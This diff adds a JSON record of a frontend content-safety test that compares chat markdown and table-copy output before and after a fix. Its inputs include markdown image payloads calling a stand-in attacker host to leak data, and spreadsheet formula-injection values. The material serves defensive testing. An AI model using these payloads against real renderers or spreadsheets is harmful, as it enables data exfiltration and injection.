@@ -1,0 +1,101 @@
+{
+  "purpose": "synthetic_frontend_content_safety_before_after",
+  "status": "passed",
+  "generated_utc": "2026-10-21T04:15:00.664Z",
+  "provenance": {
+    "baseline_commit": "c25a3332e67f644e94c6ab3b6e80155dacf7c56b",
+    "before_source": [
+      {
+        "path": "frontend/src/components/chat/AquaMessage.jsx",
+        "sha256": "7bd306a4274572a4d6f9e2e55a239f8456cbc934fac8b0b7cf8faa0f5de27491",
+        "matches_pre_overlay_baseline": true
+      },
+      {
+        "path": "frontend/src/components/data/FinancialTable.jsx",
+        "sha256": "f6f0ee70cc1bb77a4a89473c403170a1c257617fb279a2e16f04bada84fbe1a8",
+        "matches_pre_overlay_baseline": true
+      },
+      {
+        "path": "frontend/src/components/data/financialValues.js",
+        "sha256": "5b030b1f8dc0014189b20ef4344f987049d8e737424b8e68e122906940407039",
+        "matches_pre_overlay_baseline": true
+      },
+      {
+        "path": "frontend/package-lock.json",
+        "sha256": "2496fba9a6ba27dc8bb1932ab323ef300f3abb000ae08a5f79325688be8f4009",
+        "matches_pre_overlay_baseline": true
+      }
+    ],
+    "after_source": [
+      {
+        "path": "frontend/src/components/chat/AquaMessage.jsx",
+        "sha256": "e22aa9d6dccfe10d5a9dcb665b66712d9acb5b86150ad291516800779c1e4478"
+      },
+      {
+        "path": "frontend/src/components/data/FinancialTable.jsx",
+        "sha256": "4b32dc479fbf353b5f1d19a188b7c23afd963ead7dbd423ab895ff7d6f6913c0"
+      },
+      {
+        "path": "frontend/src/components/data/financialValues.js",
+        "sha256": "aca48bc8753b9825fee43b646a2685a1ebdceb21d41ae231a1d78bee164e50c2"
+      },
+      {
+        "path": "frontend/package-lock.json",
+        "sha256": "2496fba9a6ba27dc8bb1932ab323ef300f3abb000ae08a5f79325688be8f4009"
+      },
+      {
+        "path": "frontend/src/components/chat/SafeMarkdown.js",
+        "sha256": "132f5c6b19725e4854552e09248aa9d121cc7831cc381cd43b90120b54ed330a"
+      },
+      {
+        "path": "frontend/checks/safe-markdown.test.mjs",
+        "sha256": "76d3440795725337739a290cc57700e101aab3bcef10a6e5bba6f63a08a99088"
+      },
+      {
+        "path": "frontend/checks/data.test.mjs",
+        "sha256": "287b6dadc5f0f7b5f1519943de64e857bfa5ffcd3be906cbf9708f6c890c3e4b"
+      },
+      {
+        "path": "frontend/checks/content-safety-browser.mjs",
+        "sha256": "76387bb8890fcdf74cb05bf4fb0564d220aa206bdfb2a3b2db635089a90c2014"
+      }
+    ],
+    "lock_graph_unchanged": true
+  },
+  "markdown": {
+    "method": "Real installed React/ReactMarkdown SSR. Before renders the direct ReactMarkdown call present in hashed AquaMessage; after imports exact production SafeMarkdown.",
+    "cases": [
+      {
+        "input": "![report](https://attacker.invalid/collect?canary=synthetic)",
+        "before_html": "<link rel=\"preload\" as=\"image\" href=\"https://attacker.invalid/collect?canary=synthetic\"/><p><img src=\"https://attacker.invalid/collect?canary=synthetic\" alt=\"report\"/></p>",
+        "after_html": "<p></p>",
+        "before_emits_image_and_preload": true,
+        "after_emits_network_elements": false
+      },
+      {
+        "input": "![report](//attacker.invalid/collect?canary=synthetic)",
+        "before_html": "<link rel=\"preload\" as=\"image\" href=\"//attacker.invalid/collect?canary=synthetic\"/><p><img src=\"//attacker.invalid/collect?canary=synthetic\" alt=\"report\"/></p>",
+        "after_html": "<p></p>",
+        "before_emits_image_and_preload": true,
+        "after_emits_network_elements": false
+      }
+    ]
+  },
+  "clipboard": {
+    "method": "Original Copy table expression with original production formatCell versus exact production createTsv; no actual clipboard or spreadsheet application.",
+    "before": "=1+1\tAmount\n=1+1\t-12.5\nsafe\t=1+1\n@SUM(1,1)\t-3",
+    "after": "'=1+1\tAmount\n'=1+1\t-12.5\nsafe =1+1 @SUM(1,1)\t-3",
+    "before_retains_formula_header_and_cell": true,
+    "before_data_creates_extra_row": true,
+    "after_literal_marker_added": true,
+    "after_data_cannot_add_tsv_row_or_column": true,
+    "after_numeric_negatives_preserved": true
+  },
+  "limits": [
+    "No external network requests, real data or credentials.",
+    "Before SSR proves emitted image/preload elements; it is not a browser execution or network capture.",
+    "After browser observations are separate in frontend-content-safety-browser.json.",
+    "Clipboard evidence proves serialization changes; it does not claim testing every spreadsheet importer or executing a spreadsheet formula.",
+    "This renderer closure is not a whole-application guarantee against malicious code or data."
+  ]
+}
